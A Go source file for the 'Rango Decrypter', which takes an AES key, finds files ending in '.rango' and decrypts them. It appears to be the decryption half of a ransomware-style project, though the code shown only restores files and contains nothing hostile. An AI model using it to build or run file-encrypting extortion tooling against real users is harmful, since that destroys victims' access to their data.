package main

import (
	"encoding/base64"
	"fmt"

	"github.com/guptswayam/rango/rango-decrypt/decrypter"
	"github.com/guptswayam/rango/shared"
)

func main() {
	fmt.Println("Starting Rango Decrypter!")

	fmt.Println("Rango is working...")

	fmt.Print("Please provide the aes key: ")

	var base64Key string = ""

	fmt.Scanln(&base64Key)

	fileList := shared.FindFiles(".rango")

	aes32Key, err := base64.StdEncoding.DecodeString(base64Key)

	if err != nil {
		panic("Invalid key provided!")
	}

	for i := range fileList {
		decrypter.DecryptFile(aes32Key, fileList[i].FolderPath, fileList[i].FileName)
	}

	fmt.Println("Congrats! Your files has been decrypted")

	fmt.Println("Closing Rango Decrypter!")

	var isFinish string = ""
	for isFinish != "yes" {
		fmt.Println("Type yes to close")
		fmt.Scanln(&isFinish)
	}

}
